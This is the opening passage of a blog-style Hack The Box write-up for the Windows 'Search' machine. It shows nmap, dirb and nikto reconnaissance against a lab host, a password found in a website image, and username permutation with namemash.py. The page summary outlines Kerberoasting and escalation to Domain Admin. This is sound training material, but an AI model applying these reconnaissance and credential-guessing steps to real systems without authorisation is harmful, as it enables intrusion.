<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>

<meta charset="utf-8">
<meta name="generator" content="quarto-1.7.32">

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">

<meta name="author" content="0xPThree">
<meta name="dcterms.date" content="2022-01-05">
<meta name="description" content="Using a found password and username, the attacker enumerates Active Directory users. They crack a Kerberoastable user’s password and access SMB shares to find sensitive files. By extracting credentials and abusing Active Directory features, they escalate privileges and gain Domain Admin access to capture the root flag.">

<title>Search - Hack The Box – Exploit.se</title>
<style>
code{white-space: pre-wrap;}
span.smallcaps{font-variant: small-caps;}
div.columns{display: flex; gap: min(4vw, 1.5em);}
div.column{flex: auto; overflow-x: auto;}
div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
ul.task-list{list-style: none;}
ul.task-list li input[type="checkbox"] {
  width: 0.8em;
  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
  vertical-align: middle;
}
/* CSS for syntax highlighting */
html { -webkit-text-size-adjust: 100%; }
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
</style>


<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
<script src="../../site_libs/clipboard/clipboard.min.js"></script>
<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
<script src="../../site_libs/quarto-search/fuse.min.js"></script>
<script src="../../site_libs/quarto-search/quarto-search.js"></script>
<meta name="quarto:offset" content="../../">
<link href="../../favicon.ico" rel="icon">
<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
<script src="../../site_libs/quarto-html/popper.min.js"></script>
<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
<script src="../../site_libs/quarto-html/anchor.min.js"></script>
<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-37eea08aefeeee20ff55810ff984fec1.css" rel="stylesheet" id="quarto-text-highlighting-styles">
<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
<link href="../../site_libs/bootstrap/bootstrap-a98ec624fb63d9b712fc3a6f62e2b305.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
<script id="quarto-search-options" type="application/json">{
  "location": "navbar",
  "copy-button": false,
  "collapse-after": 3,
  "panel-placement": "end",
  "type": "overlay",
  "limit": 50,
  "keyboard-shortcut": [
    "f",
    "/",
    "s"
  ],
  "show-item-context": false,
  "language": {
    "search-no-results-text": "No results",
    "search-matching-documents-text": "matching documents",
    "search-copy-link-title": "Copy link to search",
    "search-hide-matches-text": "Hide additional matches",
    "search-more-match-text": "more match in this document",
    "search-more-matches-text": "more matches in this document",
    "search-clear-button-title": "Clear",
    "search-text-placeholder": "",
    "search-detached-cancel-button-title": "Cancel",
    "search-submit-button-title": "Submit",
    "search-label": "Search"
  }
}</script>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>

<script type="text/javascript">

window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
</script>


<link rel="stylesheet" href="../../scss/styles.css">
<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
</head>

<body class="nav-fixed quarto-light">

<div id="quarto-search-results"></div>
  <header id="quarto-header" class="headroom fixed-top quarto-banner">
    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
      <div class="navbar-container container-fluid">
      <div class="navbar-brand-container mx-auto">
    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
    <img src="../../assets/images/exploit_white-orange.png" alt="" class="navbar-logo">
    </a>
  </div>
            <div id="quarto-search" class="" title="Search"></div>
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
  <span class="navbar-toggler-icon"></span>
</button>
          <div class="collapse navbar-collapse" id="navbarCollapse">
            <ul class="navbar-nav navbar-nav-scroll ms-auto">
  <li class="nav-item">
    <a class="nav-link" href="../../writeups.html"> 
<span class="menu-text">Writeups</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
<span class="menu-text">Notes</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="../../about.html"> 
<span class="menu-text">About</span></a>
  </li>  
</ul>
          </div> <!-- /navcollapse -->
            <div class="quarto-navbar-tools">
</div>
      </div> <!-- /container-fluid -->
    </nav>
</header>
<!-- content -->
<header id="title-block-header" class="quarto-title-block default page-columns page-full">
  <div class="quarto-title-banner page-columns page-full">
    <div class="quarto-title column-body">
      <h1 class="title">Search - Hack The Box</h1>
                  <div>
        <div class="description">
          Using a found password and username, the attacker enumerates Active Directory users. They crack a Kerberoastable user’s password and access SMB shares to find sensitive files. By extracting credentials and abusing Active Directory features, they escalate privileges and gain Domain Admin access to capture the root flag.
        </div>
      </div>
                          <div class="quarto-categories">
                <div class="quarto-category">hackthebox</div>
                <div class="quarto-category">windows</div>
                <div class="quarto-category">mysql</div>
                <div class="quarto-category">mattermost</div>
              </div>
                  </div>
  </div>
    
  
  <div class="quarto-title-meta">

      <div>
      <div class="quarto-title-meta-heading">Author</div>
      <div class="quarto-title-meta-contents">
               <p>0xPThree </p>
            </div>
    </div>
      
      <div>
      <div class="quarto-title-meta-heading">Published</div>
      <div class="quarto-title-meta-contents">
        <p class="date">January 5, 2022</p>
      </div>
    </div>
    
      
    </div>
    
  
  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
<!-- sidebar -->
<!-- margin-sidebar -->
    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
        <nav id="TOC" role="doc-toc" class="toc-active">
    <h2 id="toc-title">On this page</h2>
   
  <ul>
  <li><a href="#user" id="toc-user" class="nav-link active" data-scroll-target="#user">USER</a>
  <ul class="collapse">
  <li><a href="#step-1" id="toc-step-1" class="nav-link" data-scroll-target="#step-1">Step 1</a></li>
  <li><a href="#step-2" id="toc-step-2" class="nav-link" data-scroll-target="#step-2">Step 2</a></li>
  <li><a href="#step-3" id="toc-step-3" class="nav-link" data-scroll-target="#step-3">Step 3</a></li>
  <li><a href="#step-4" id="toc-step-4" class="nav-link" data-scroll-target="#step-4">Step 4</a></li>
  </ul></li>
  <li><a href="#root-method-1" id="toc-root-method-1" class="nav-link" data-scroll-target="#root-method-1">ROOT Method 1</a>
  <ul class="collapse">
  <li><a href="#step-1-1" id="toc-step-1-1" class="nav-link" data-scroll-target="#step-1-1">Step 1</a></li>
  </ul></li>
  <li><a href="#root-method-2" id="toc-root-method-2" class="nav-link" data-scroll-target="#root-method-2">ROOT Method 2</a>
  <ul class="collapse">
  <li><a href="#step-1-2" id="toc-step-1-2" class="nav-link" data-scroll-target="#step-1-2">Step 1</a></li>
  <li><a href="#step-2-1" id="toc-step-2-1" class="nav-link" data-scroll-target="#step-2-1">Step 2</a></li>
  <li><a href="#step-3-1" id="toc-step-3-1" class="nav-link" data-scroll-target="#step-3-1">Step 3</a></li>
  </ul></li>
  <li><a href="#references" id="toc-references" class="nav-link" data-scroll-target="#references">References</a></li>
  </ul>
</nav>
    </div>
<!-- main -->
<main class="content quarto-banner-title-block" id="quarto-document-content">





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> nmap <span class="at">-p-</span> 10.10.11.129</span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>      STATE SERVICE</span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">53/tcp</span>    open  domain</span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span>    open  http</span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">88/tcp</span>    open  kerberos-sec</span>
<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">135/tcp</span>   open  msrpc</span>
<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">139/tcp</span>   open  netbios-ssn</span>
<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="ex">389/tcp</span>   open  ldap</span>
<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="ex">443/tcp</span>   open  https</span>
<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ex">445/tcp</span>   open  microsoft-ds</span>
<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="ex">464/tcp</span>   open  kpasswd5</span>
<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="ex">593/tcp</span>   open  http-rpc-epmap</span>
<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="ex">636/tcp</span>   open  ldapssl</span>
<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="ex">3268/tcp</span>  open  globalcatLDAP</span>
<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="ex">3269/tcp</span>  open  globalcatLDAPssl</span>
<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="ex">8172/tcp</span>  open  unknown</span>
<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="ex">9389/tcp</span>  open  adws</span>
<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="ex">49666/tcp</span> open  unknown</span>
<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="ex">49669/tcp</span> open  unknown</span>
<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a><span class="ex">49670/tcp</span> open  unknown</span>
<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="ex">49695/tcp</span> open  unknown</span>
<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a><span class="ex">49705/tcp</span> open  unknown</span>
<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-sCV</span> <span class="at">-p53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389,4966,49669,49670,49695,49705</span> 10.10.11.129</span>
<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>      STATE    SERVICE       VERSION</span>
<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a><span class="ex">53/tcp</span>    open     domain        Simple DNS Plus</span>
<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span>    open     http          Microsoft IIS httpd 10.0</span>
<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">http-methods:</span> </span>
<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  Potentially risky methods: TRACE</span>
<span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Microsoft-IIS/10.0</span>
<span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Search <span class="kw">&amp;</span><span class="ex">mdash</span><span class="kw">;</span> <span class="ex">Just</span> Testing IIS</span>
<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a><span class="ex">88/tcp</span>    open     kerberos-sec  Microsoft Windows Kerberos <span class="er">(</span><span class="ex">server</span> time: 2022-01-03 08:57:12Z<span class="kw">)</span></span>
<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a><span class="ex">135/tcp</span>   open     msrpc         Microsoft Windows RPC</span>
<span id="cb1-37"><a href="#cb1-37" aria-hidden="true" tabindex="-1"></a><span class="ex">139/tcp</span>   open     netbios-ssn   Microsoft Windows netbios-ssn</span>
<span id="cb1-38"><a href="#cb1-38" aria-hidden="true" tabindex="-1"></a><span class="ex">389/tcp</span>   open     ldap          Microsoft Windows Active Directory LDAP <span class="er">(</span><span class="ex">Domain:</span> search.htb0., Site: Default-First-Site-Name<span class="kw">)</span></span>
<span id="cb1-39"><a href="#cb1-39" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssl-cert:</span> Subject: commonName=research</span>
<span id="cb1-40"><a href="#cb1-40" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2020-08-11T08:13:35</span>
<span id="cb1-41"><a href="#cb1-41" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2030-08-09T08:13:35</span>
<span id="cb1-42"><a href="#cb1-42" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_ssl-date:</span> 2022-01-03T08:58:40+00:00<span class="kw">;</span> <span class="ex">+2m17s</span> from scanner time.</span>
<span id="cb1-43"><a href="#cb1-43" aria-hidden="true" tabindex="-1"></a><span class="ex">443/tcp</span>   open     ssl/http      Microsoft IIS httpd 10.0</span>
<span id="cb1-44"><a href="#cb1-44" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">http-methods:</span> </span>
<span id="cb1-45"><a href="#cb1-45" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  Potentially risky methods: TRACE</span>
<span id="cb1-46"><a href="#cb1-46" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Microsoft-IIS/10.0</span>
<span id="cb1-47"><a href="#cb1-47" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Search <span class="kw">&amp;</span><span class="ex">mdash</span><span class="kw">;</span> <span class="ex">Just</span> Testing IIS</span>
<span id="cb1-48"><a href="#cb1-48" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssl-cert:</span> Subject: commonName=research</span>
<span id="cb1-49"><a href="#cb1-49" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2020-08-11T08:13:35</span>
<span id="cb1-50"><a href="#cb1-50" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2030-08-09T08:13:35</span>
<span id="cb1-51"><a href="#cb1-51" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_ssl-date:</span> 2022-01-03T08:58:40+00:00<span class="kw">;</span> <span class="ex">+2m17s</span> from scanner time.</span>
<span id="cb1-52"><a href="#cb1-52" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">tls-alpn:</span> </span>
<span id="cb1-53"><a href="#cb1-53" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  http/1.1</span>
<span id="cb1-54"><a href="#cb1-54" aria-hidden="true" tabindex="-1"></a><span class="ex">445/tcp</span>   open     microsoft-ds<span class="pp">?</span></span>
<span id="cb1-55"><a href="#cb1-55" aria-hidden="true" tabindex="-1"></a><span class="ex">464/tcp</span>   open     kpasswd5<span class="pp">?</span></span>
<span id="cb1-56"><a href="#cb1-56" aria-hidden="true" tabindex="-1"></a><span class="ex">593/tcp</span>   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-57"><a href="#cb1-57" aria-hidden="true" tabindex="-1"></a><span class="ex">636/tcp</span>   open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class="er">(</span><span class="ex">Domain:</span> search.htb0., Site: Default-First-Site-Name<span class="kw">)</span></span>
<span id="cb1-58"><a href="#cb1-58" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssl-cert:</span> Subject: commonName=research</span>
<span id="cb1-59"><a href="#cb1-59" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2020-08-11T08:13:35</span>
<span id="cb1-60"><a href="#cb1-60" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2030-08-09T08:13:35</span>
<span id="cb1-61"><a href="#cb1-61" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_ssl-date:</span> 2022-01-03T08:58:40+00:00<span class="kw">;</span> <span class="ex">+2m17s</span> from scanner time.</span>
<span id="cb1-62"><a href="#cb1-62" aria-hidden="true" tabindex="-1"></a><span class="ex">3268/tcp</span>  open     ldap          Microsoft Windows Active Directory LDAP <span class="er">(</span><span class="ex">Domain:</span> search.htb0., Site: Default-First-Site-Name<span class="kw">)</span></span>
<span id="cb1-63"><a href="#cb1-63" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssl-cert:</span> Subject: commonName=research</span>
<span id="cb1-64"><a href="#cb1-64" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2020-08-11T08:13:35</span>
<span id="cb1-65"><a href="#cb1-65" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2030-08-09T08:13:35</span>
<span id="cb1-66"><a href="#cb1-66" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_ssl-date:</span> 2022-01-03T08:58:40+00:00<span class="kw">;</span> <span class="ex">+2m17s</span> from scanner time.</span>
<span id="cb1-67"><a href="#cb1-67" aria-hidden="true" tabindex="-1"></a><span class="ex">3269/tcp</span>  open     ssl/ldap      Microsoft Windows Active Directory LDAP <span class="er">(</span><span class="ex">Domain:</span> search.htb0., Site: Default-First-Site-Name<span class="kw">)</span></span>
<span id="cb1-68"><a href="#cb1-68" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssl-cert:</span> Subject: commonName=research</span>
<span id="cb1-69"><a href="#cb1-69" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Not</span> valid before: 2020-08-11T08:13:35</span>
<span id="cb1-70"><a href="#cb1-70" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_Not</span> valid after:  2030-08-09T08:13:35</span>
<span id="cb1-71"><a href="#cb1-71" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_ssl-date:</span> 2022-01-03T08:58:40+00:00<span class="kw">;</span> <span class="ex">+2m17s</span> from scanner time.</span>
<span id="cb1-72"><a href="#cb1-72" aria-hidden="true" tabindex="-1"></a><span class="ex">4966/tcp</span>  filtered unknown</span>
<span id="cb1-73"><a href="#cb1-73" aria-hidden="true" tabindex="-1"></a><span class="ex">8172/tcp</span>  open     ssl/http      Microsoft IIS httpd 10.0</span>
<span id="cb1-74"><a href="#cb1-74" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Microsoft-IIS/10.0</span>
<span id="cb1-75"><a href="#cb1-75" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Site doesn<span class="st">'t have a title.</span></span>
<span id="cb1-76"><a href="#cb1-76" aria-hidden="true" tabindex="-1"></a><span class="st">| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH</span></span>
<span id="cb1-77"><a href="#cb1-77" aria-hidden="true" tabindex="-1"></a><span class="st">| Not valid before: 2020-04-07T09:05:25</span></span>
<span id="cb1-78"><a href="#cb1-78" aria-hidden="true" tabindex="-1"></a><span class="st">|_Not valid after:  2030-04-05T09:05:25</span></span>
<span id="cb1-79"><a href="#cb1-79" aria-hidden="true" tabindex="-1"></a><span class="st">|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.</span></span>
<span id="cb1-80"><a href="#cb1-80" aria-hidden="true" tabindex="-1"></a><span class="st">| tls-alpn: </span></span>
<span id="cb1-81"><a href="#cb1-81" aria-hidden="true" tabindex="-1"></a><span class="st">|_  http/1.1</span></span>
<span id="cb1-82"><a href="#cb1-82" aria-hidden="true" tabindex="-1"></a><span class="st">9389/tcp  open     mc-nmf        .NET Message Framing</span></span>
<span id="cb1-83"><a href="#cb1-83" aria-hidden="true" tabindex="-1"></a><span class="st">49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0</span></span>
<span id="cb1-84"><a href="#cb1-84" aria-hidden="true" tabindex="-1"></a><span class="st">49670/tcp open     msrpc         Microsoft Windows RPC</span></span>
<span id="cb1-85"><a href="#cb1-85" aria-hidden="true" tabindex="-1"></a><span class="st">49695/tcp open     msrpc         Microsoft Windows RPC</span></span>
<span id="cb1-86"><a href="#cb1-86" aria-hidden="true" tabindex="-1"></a><span class="st">49705/tcp open     msrpc         Microsoft Windows RPC</span></span>
<span id="cb1-87"><a href="#cb1-87" aria-hidden="true" tabindex="-1"></a><span class="st">Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows</span></span>
<span id="cb1-88"><a href="#cb1-88" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-89"><a href="#cb1-89" aria-hidden="true" tabindex="-1"></a><span class="st">Host script results:</span></span>
<span id="cb1-90"><a href="#cb1-90" aria-hidden="true" tabindex="-1"></a><span class="st">|_clock-skew: mean: 2m16s, deviation: 0s, median: 2m16s</span></span>
<span id="cb1-91"><a href="#cb1-91" aria-hidden="true" tabindex="-1"></a><span class="st">| smb2-security-mode: </span></span>
<span id="cb1-92"><a href="#cb1-92" aria-hidden="true" tabindex="-1"></a><span class="st">|   2.02: </span></span>
<span id="cb1-93"><a href="#cb1-93" aria-hidden="true" tabindex="-1"></a><span class="st">|_    Message signing enabled and required</span></span>
<span id="cb1-94"><a href="#cb1-94" aria-hidden="true" tabindex="-1"></a><span class="st">| smb2-time: </span></span>
<span id="cb1-95"><a href="#cb1-95" aria-hidden="true" tabindex="-1"></a><span class="st">|   date: 2022-01-03T08:58:05</span></span>
<span id="cb1-96"><a href="#cb1-96" aria-hidden="true" tabindex="-1"></a><span class="st">|_  start_date: N/A</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>dirb:</strong></p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">==</span><span class="op">&gt;</span> DIRECTORY: http://10.10.11.129/certenroll/</span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.129/certsrv <span class="er">(</span><span class="ex">CODE:401</span><span class="kw">|</span><span class="ex">SIZE:1293</span><span class="kw">)</span></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">==</span><span class="op">&gt;</span> DIRECTORY: http://10.10.11.129/css/</span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">==</span><span class="op">&gt;</span> DIRECTORY: http://10.10.11.129/fonts/</span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">==</span><span class="op">&gt;</span> DIRECTORY: http://10.10.11.129/images/</span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="ex">==</span><span class="op">&gt;</span> DIRECTORY: http://10.10.11.129/Images/</span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.129/index.html <span class="er">(</span><span class="ex">CODE:200</span><span class="kw">|</span><span class="ex">SIZE:44982</span><span class="kw">)</span></span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="ex">==</span><span class="op">&gt;</span> DIRECTORY: http://10.10.11.129/js/</span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> http://10.10.11.129/staff <span class="er">(</span><span class="ex">CODE:403</span><span class="kw">|</span><span class="ex">SIZE:1233</span><span class="kw">)</span> </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>nikto:</strong></p>
<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span> 80:</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Server: Microsoft-IIS/10.0</span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">+</span> Retrieved x-aspnet-version header: 4.0.30319</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>ffuf:</strong></p>
<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">N/A</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>Domain:</strong> search.htb <strong>Hostname:</strong> research</p>
<p>Looking closely on the webpage we find <a href="https://search.htb/images/slide_2.jpg">THIS IMAGE</a> containing the password <code>IsolationIsKey?</code> and user Hope Sharp.</p>
<p>![[Pasted image 20220103130917.png]]</p>
<p>Using <code>namemash.py</code> we can create the most common permutations of Hope Sharp to hopefully get a valid username.</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> cat hope.txt     </span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Hope</span> Sharp</span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> /opt/namemash.py hope.txt <span class="op">&gt;</span> hope-username.txt</span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/htb/search]</span></span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> cat hope-username.txt </span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="ex">hopesharp</span></span>
